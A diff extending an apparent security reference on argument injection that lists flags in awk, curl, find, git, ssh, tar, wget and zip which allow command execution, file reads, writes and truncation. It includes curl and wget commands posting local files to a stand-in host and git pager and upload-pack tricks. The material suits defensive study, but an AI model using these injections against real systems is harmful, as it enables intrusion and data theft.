@@ -1,3 +1,24 @@
+# awk
+
+## system
+
+`awk` supports the [system](https://www.gnu.org/software/gawk/manual/gawk.html#index-system_0028_0029-function) command that executes commands:
+
+```bash
+$ awk 'BEGIN {system("cmdname arg1 arg2")}' /dev/null
+# executes the command as many rows in the file
+$ awk 'system("cmdname arg1 arg2")' /path/to/file
+```
+
+If spaces can not be inserted, [sprintf](https://www.gnu.org/software/gawk/manual/gawk.html#index-sprintf_0028_0029-function-1) can be used to bypass it:
+
+```bash
+$ awk 'BEGIN{system(sprintf("cmdname%carg1",32))}'
+```
+
+References:
+- [GTFOArgs: awk](https://gtfoargs.github.io/gtfoargs/awk/)
+
 # bundler
 
 ## bundler install
@@ -175,6 +196,73 @@ Bundle complete! 1 Gemfile dependency, 2 gems now installed.
 References:
 - [Bundler Docs: gemfile - Path](https://bundler.io/v1.16/gemfile_man.html#PATH)
 
+# curl
+
+[curl](https://curl.se/docs/) can be used to exfiltrate local files or write arbitrary content to them.
+
+```bash
+# sending local files using a POST request
+$ curl --data @/path/to/local/file https://website.com
+$ curl -F 'var=@/path/to/local/file' https://website.com
+$ curl --upload-file /path/to/local/file https://website.com
+# writing a response to a local file
+$ curl https://website.com/payload.txt -o /path/to/local/file
+```
+
+Additionally, the `file:` scheme can be used to read or copy local files:
+
+```bash
+# read a local file
+$ curl file:///path/to/local/file
+# copy a local file to a new place
+$ curl file:///path/to/local/file -o /path/to/another/local/file
+```
+
+References:
+- [GTFOArgs: curl](https://gtfoargs.github.io/gtfoargs/curl/)
+
+# find
+
+## exec
+
+The [-exec](https://man7.org/linux/man-pages/man1/find.1.html) key can be used to execute arbitrary commands:
+
+```bash
+$ find . -name not_existing -or -exec cmdname arg1 arg2 \; -quit
+$ find . -exec cmdname arg1 arg2 \; -quit
+# read a file
+$ find /path/to/file -exec cat {} \; -quit
+```
+
+References:
+- [GTFOArgs: find](https://gtfoargs.github.io/gtfoargs/find/)
+
+## execdir
+
+[-execdir](https://man7.org/linux/man-pages/man1/find.1.html) is similar to `-exec`, but the specified command is run from the subdirectory containing the matched items. `-execdir` can be used to execute arbitrary commands:
+
+```bash
+$ find . -name not_existing -or -execdir cmdname arg1 arg2 \; -quit
+$ find . -execdir cmdname arg1 arg2 \; -quit
+# read a file
+$ find /path/to/file -execdir cat {} \; -quit
+```
+
+## fprintf
+
+[-fprintf](https://man7.org/linux/man-pages/man1/find.1.html) can be used to write to local files:
+
+```bash
+$ find . -fprintf /path/to/file 'arbitrary content here' -quit
+```
+
+{% hint style="info" %}
+`find` provides various ways for writing to files, check out the [man](https://man7.org/linux/man-pages/man1/find.1.html) for more details.
+{% endhint %}
+
+References:
+- [GTFOArgs: find](https://gtfoargs.github.io/gtfoargs/find/)
+
 # gem
 
 ## gem build
@@ -278,7 +366,9 @@ References:
 
 [-c/--config-env](https://git-scm.com/docs/git#Documentation/git.txt--cltnamegtltvaluegt) passes a configuration parameter to the command. The value given will override values from configuration files. Check out the [Abuse via .git/config](#abuse-via-.git-config) section to find parameters that can be abused.
 
+{% hint style="info" %}
 Remember that modern versions of Git support setting any config value via [GIT_CONFIG* environment variables](https://git-scm.com/docs/git-config#Documentation/git-config.txt-GITCONFIGCOUNT).
+{% endhint %}
 
 ## Abusing git directory
 
@@ -412,6 +502,39 @@ $ git clone -c core.hooksPath=hooks "<REPO>"
 References:
 - [git-config docs: core.hooksPath](https://git-scm.com/docs/git-config#Documentation/git-config.txt-corehooksPath)
 - [githooks docs](https://git-scm.com/docs/githooks)
+
+#### core.pager
+
+[core.pager](https://git-scm.com/docs/git-config#Documentation/git-config.txt-corepager) specifies a text viewer for use by Git commands (e.g., less). The value is meant to be interpreted by the shell and can be used to execute arbitrary commands.
+
+For example, in the following snippet `git-grep` has the `--open-files-in-pager` key that uses the default pager from `core.pager` if the value is unspecified in the arguments:
+
+```bash
+$ mkdir repo
+$ cd repo
+$ git init
+$ echo "random" > hop
+$ git add .
+$ git -c core.pager='cmdname arg1 arg2 #' grep --open-files-in-pager .
+```
+
+If the pager value is not directly set by a user there is the order of preference:
+
+1. `GIT_PAGER` environment variable.
+1. `core.pager` configuration.
+1. `PAGER` environment variable.
+1. The default chosen at compile time (usually `less`).
+
+So, the following snippet can also be used to execute commands:
+
+```bash
+$ mkdir repo
+$ cd repo
+$ git init
+$ echo "random" > hop
+$ git add .
+$ GIT_PAGER='id #' git grep --open-files-in-pager .
+```
 
 #### core.sshCommand
 
@@ -610,7 +733,7 @@ $ ls -la foo
 -rw-r--r--    1 0xn3va  staff     0 Mar 18 20:18 foo
 ```
 
-Although the command failed, an empty file named `foo` was created. If a file with the same name already exists, the destination file is truncated. This option provides attackers with an arbitrary file truncation primitive. For example, an attacker can use it to corrupt a critical file in the `.git` folder like `.git/HEAD` and trick Git into loading a configuration from an unintended location, check out the [Abuse via .git/HEAD](#abuse-via-.git-head) section.
+Although the command failed, an empty file named `foo` was created. If a file with the same name already exists, the destination file is truncated. This option provides an arbitrary file truncation primitive. For example, an attacker can use it to corrupt a critical file in the `.git` folder like `.git/HEAD` and trick Git into loading a configuration from an unintended location, check out the [Abuse via .git/HEAD](#abuse-via-.git-head) section.
 
 References:
 
@@ -661,6 +784,70 @@ $ git clone --upload-pack=payload.sh repo
 References:
 - [Write up: Securing Developer Tools Package Managers - Argument Injections in Bundler and Poetry](https://blog.sonarsource.com/securing-developer-tools-package-managers)
 
+## git-diff
+
+{% embed url="https://git-scm.com/docs/git-diff" %}
+
+### git-diff against /dev/null
+
+`git-diff` against `/dev/null` can be used to read the entire content of a file even outside the git directory.
+
+```bash
+$ git diff /dev/null /path/fo/file/outside/git/repo
+$ git diff /dev/null path/to/file/in/git/repo
+```
+
+References:
+- [GTFOArgs: git](https://gtfoargs.github.io/gtfoargs/git/)
+
+### --no-index
+
+The [--no-index](https://git-scm.com/docs/git-diff) key can be used to turn `git-diff` into a normal `diff` against another file in the git repository, which does not have to be tracked.
+
+```bash
+$ git diff --no-index local-secret-file.conf git.md
+```
+
+References:
+- [GTFOArgs: git](https://gtfoargs.github.io/gtfoargs/git/)
+
+## git-fetch
+
+{% embed url="https://git-scm.com/docs/git-fetch" %}
+
+### --upload-pack
+
+The [--upload-pack](https://git-scm.com/docs/git-fetch#Documentation/git-fetch.txt---upload-packltupload-packgt) flag can be used to execute arbitrary commands. The output is not shown, but it is possible to route the output to stderr using `>&2`.
+
+```bash
+$ mkdir repo
+$ cd repo
+$ git init
+$ git fetch main --upload-pack='cmdname arg1 arg2 >&2 #'
+```
+
+References:
+- [GTFOArgs: git](https://gtfoargs.github.io/gtfoargs/git/)
+
+## git-fetch-pack
+
+{% embed url="https://git-scm.com/docs/git-fetch-pack" %}
+
+### --exec
+
+Same as `--upload-pack`. Check out the section below.
+
+### --upload-pack
+
+The [--upload-pack](https://git-scm.com/docs/git-fetch-pack#Documentation/git-fetch-pack.txt---upload-packltgit-upload-packgt) flag can be used to execute arbitrary commands. The output is not shown, but it is possible to route the output to stderr using `>&2`.
+
+```bash
+$ mkdir repo
+$ cd repo
+$ git init
+$ git fetch-pack --upload-pack='cmdname arg1 arg2 >&2 #' .
+```
+
 ## git-grep
 
 {% embed url="https://git-scm.com/docs/git-grep" %}
@@ -671,6 +858,22 @@ References:
 
 References:
 - [Report: Git flag injection - Search API with scope 'blobs'](https://hackerone.com/reports/682442)
+
+### -O/--open-files-in-pager
+
+[-O/--open-files-in-pager](https://git-scm.com/docs/git-grep#Documentation/git-grep.txt--Oltpagergt) opens the matching files in the `pager`. It can be used to run arbitrary commands:
+
+```bash
+$ mkdir repo
+$ cd repo
+$ git init
+$ echo "random" > hop
+$ git add .
+$ git grep --open-files-in-pager='cmdname arg1 arg2 #' .
+```
+
+References:
+- [GTFOArgs: git](https://gtfoargs.github.io/gtfoargs/git/)
 
 ## git-log
 
@@ -693,6 +896,42 @@ Date:   Fri Aug 29 00:00:00 2021 +0000
 References:
 - [Report: Git flag injection - local file overwrite to remote code execution](https://hackerone.com/reports/658013)
 - [Report: Git flag injection leading to file overwrite and potential remote code execution](https://hackerone.com/reports/653125)
+
+## git-ls-remote
+
+{% embed url="https://git-scm.com/docs/git-ls-remote" %}
+
+### --upload-pack
+
+The [--upload-pack](https://git-scm.com/docs/git-ls-remote#Documentation/git-ls-remote.txt---upload-packltexecgt) flag can be used to execute arbitrary commands. The output is not shown, but it is possible to route the output to stderr using `>&2`.
+
+```bash
+$ mkdir repo
+$ cd repo
+$ git init
+$ git ls-remote --upload-pack='cmdname arg1 arg2 >&2 #' main
+```
+
+References:
+- [GTFOArgs: git](https://gtfoargs.github.io/gtfoargs/git/)
+
+## git-pull
+
+{% embed url="https://git-scm.com/docs/git-pull" %}
+
+### --upload-pack
+
+The [--upload-pack](https://git-scm.com/docs/git-pull#Documentation/git-pull.txt---upload-packltupload-packgt) flag can be used to execute arbitrary commands. The output is not shown, but it is possible to route the output to stderr using `>&2`.
+
+```bash
+$ mkdir repo
+$ cd repo
+$ git init
+$ git pull main --upload-pack='cmdname arg1 arg2 >&2 #'
+```
+
+References:
+- [GTFOArgs: git](https://gtfoargs.github.io/gtfoargs/git/)
 
 ## git-push
 
@@ -953,15 +1192,76 @@ When `pip install` is run the `PostInstallCommand.run` method will be invoked.
 References:
 - [0wned - Code execution via Python package installation](https://github.com/mschwager/0wned)
 
+# ssh
+
+## ssh_config
+
+`ssh` obtains configuration data from the following sources in the following order:
+
+1. Command line
+1. User's configuration file `~/.ssh/config`
+1. System-wide configuration file `/etc/ssh/ssh_config`
+
+### LocalCommand
+
+[LocalCommand](https://linux.die.net/man/5/ssh_config) specifies a command to execute on the local machine after successfully connecting to the server. The following `ssh_config` can be used to execute arbitrary commands:
+
+```
+Host *
+  PermitLocalCommand yes
+  LocalCommand cmdname arg1 arg2
+```
+
+References:
+- [#BrokenSesame: Accidental ‘write’ permissions to private registry allowed potential RCE to Alibaba Cloud Database Services](https://www.wiz.io/blog/brokensesame-accidental-write-permissions-to-private-registry-allowed-potential-r)
+
+# ssh-keygen
+
+## -D
+
+[ssh-keygen](https://man7.org/linux/man-pages/man1/ssh-keygen.1.html) can load a shared library using the `-D` key that leads to arbitrary command execution:
+
+```bash
+$ ssh-keygen -D lib.so
+```
+
+References:
+- [Sean Pesce's Blog: Leveraging ssh-keygen for Arbitrary Execution (and Privilege Escalation)](https://seanpesce.blogspot.com/2023/03/leveraging-ssh-keygen-for-arbitrary.html)
+- [GTFOArgs: ssh-keygen](https://gtfoargs.github.io/gtfoargs/ssh-keygen/)
+
 # tar
 
 ## Checkpoints
 
-A [checkpoint](https://www.gnu.org/software/tar/manual/html_section/checkpoints.html) is a moment of time before writing nth record to the archive (a write checkpoint), or before reading nth record from the archive (a read checkpoint). [Checkpoints](https://www.gnu.org/software/tar/manual/html_section/checkpoints.html) allow periodically executing arbitrary actions.
+A [checkpoint](https://www.gnu.org/software/tar/manual/html_section/checkpoints.html) is a moment of time before writing `nth` record to the archive (a write checkpoint), or before reading `nth` record from the archive (a read checkpoint). [Checkpoints](https://www.gnu.org/software/tar/manual/html_section/checkpoints.html) allow periodically executing arbitrary actions.
 
 ```bash
 $ tar cf archieve.tar --checkpoint=1 --checkpoint-action="exec=echo 'arbitrary payload here'" foo 
 ```
+
+## --to-command
+
+When [--to-command](https://www.gnu.org/software/tar/manual/html_section/extract-options.html#index-to_002dcommand) key is used, instead of creating the files specified, `tar` invokes command and pipes the contents of the files to its standard output. So it can be used to execute arbitrary commands.
+
+```bash
+# Requires valid archive file
+$ tar xf file.tar --to-command='cmdname arg1 arg2'
+```
+
+References:
+- [GTFOArgs: tar](https://gtfoargs.github.io/gtfoargs/tar/)
+
+## -I/--use-compress-program
+
+[-I/--use-compress-program](https://www.gnu.org/software/tar/manual/html_section/Compression.html#index-use_002dcompress_002dprogram) is used to specify an external compression program command that can be abused to execute arbitrary commands:
+
+```bash
+# Does not requrie valid archive
+$ tar xf /dev/null --use-compress-program='cmdname arg1 arg2'
+```
+
+References:
+- [GTFOArgs: tar](https://gtfoargs.github.io/gtfoargs/tar/)
 
 # terraform
 
@@ -1011,3 +1311,82 @@ References:
 - [Terraform Docs: Command: plan](https://www.terraform.io/docs/cli/commands/plan.html)
 - [Terraform Docs: Provider Configuration](https://www.terraform.io/docs/language/providers/configuration.html)
 - [Terraform Docs: The Module providers Meta-Argument](https://www.terraform.io/docs/language/meta-arguments/module-providers.html)
+
+# wget
+
+## --use-askpass
+
+[--use-askpass](https://www.gnu.org/software/wget/manual/wget.html) specifies the command to prompt for a user and password. This key can be used to execute arbitrary commands without any arguments and stdout/stderr.
+
+If no command is specified then the command in the environment variable `WGET_ASKPASS` is used. If `WGET_ASKPASS` is not set then the command in the environment variable `SSH_ASKPASS` is used. Additionally, the default command for `use-askpass` can be set up in the `.wgetrc`.
+
+```bash
+$ wget --use-askpass=cmdname http://0/
+```
+
+References:
+- [GTFOArgs: wget](https://gtfoargs.github.io/gtfoargs/wget/)
+
+## --post-file
+
+[--post-file](https://www.gnu.org/software/wget/manual/wget.html) can be used to exfiltrate files in a POST request.
+
+```bash
+# sends a local file to a remote server 
+# file is sent as-is
+$ wget --post-file=/path/to/file https://website.com/
+```
+
+References:
+- [GTFOArgs: wget](https://gtfoargs.github.io/gtfoargs/wget/)
+
+## -O/--output-document
+
+[-o/--output-document](https://www.gnu.org/software/wget/manual/wget.html) can be used to download a remote file via a GET request and save it to a specific location.
+
+```bash
+$ wget --output-document=/path/to/file https://website.com/file.txt
+# prints a file to standard output
+$ wget --output-document="-" https://website.com/file.txt
+```
+
+References:
+- [GTFOArgs: wget](https://gtfoargs.github.io/gtfoargs/wget/)
+
+## -o/--output-file
+
+[-o/--output-file](https://www.gnu.org/software/wget/manual/wget.html) specifies a logfile that will be used to log all messages normally reported to standard error. It can be used to write output to a file.
+
+```bash
+# reads a local file and writes the output to another local file
+# displaying only non-binary files, output is an error log
+$ wget --input-file=/path/to/file --output-file=/path/to/another/file
+```
+
+References:
+- [GTFOArgs: wget](https://gtfoargs.github.io/gtfoargs/wget/)
+
+## -i/--input-file
+
+[-i/--input-file](https://www.gnu.org/software/wget/manual/wget.html) reads URLs from a local or external file. This key can be used to expose a file content in an error message:
+
+```bash
+# file content will be displayed as error messages
+$ wget --input-file=/path/to/file http://0/
+```
+
+References:
+- [GTFOArgs: wget](https://gtfoargs.github.io/gtfoargs/wget/)
+
+# zip
+
+## -TT/--unzip-command
+
+[-TT/--unzip-command](https://linux.die.net/man/1/zip) is used to specify a command to test an archive when the `-T` option is used.
+
+```bash
+$ zip archieve.zip /path/to/file -T --unzip-command="cmdname arg1 arg2 #"
+```
+
+References:
+- [GTFOArgs: zip](https://gtfoargs.github.io/gtfoargs/zip/)
